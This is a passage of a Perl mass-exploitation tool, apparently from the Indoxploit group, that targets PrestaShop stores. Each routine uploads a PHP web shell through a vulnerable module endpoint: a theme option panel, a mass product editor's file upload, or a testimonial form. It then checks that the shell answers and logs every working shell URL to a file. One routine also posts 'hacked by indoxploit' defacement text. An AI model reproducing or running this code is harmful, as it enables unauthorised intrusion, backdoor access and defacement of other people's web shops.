print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="tool/priv.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/priv.php?c=izo";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="tool/priv.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/priv.php?c=izo";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ blocktestimonial #####################
sub blocktestimonial(){
my $url = "$site/modules/blocktestimonial/addtestimonial.php";


my $response = $ua->post( $url,
            testimonial_submitter_name => "indoxploit",
            testimonial_title => "hacked by indoxploit",
            testimonial_main_message => "hacked by indoxploit",			
            testimonial_img => "tool/priv.php",
            testimonial => "Submit Testimonial"			
           
            );
$blocktestimonialup="$site/upload/priv.php?c=izo";

my $checkblocktestimonial = $ua->get("$blocktestimonialup")->content;
if($checkblocktestimonial =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"blocktestimonial";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $blocktestimonialup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$blocktestimonialup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"blocktestimonial";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ masseditproduct #####################
sub blocktestimonialt(){
my $url = "$site/modules/blocktestimonial/addtestimonial.php";
my $shell ="tool/priv.php";
my $field_name = "userfile";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/upload/priv.php?c=izo";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"blocktestimonial2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"blocktestimonial2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
}
}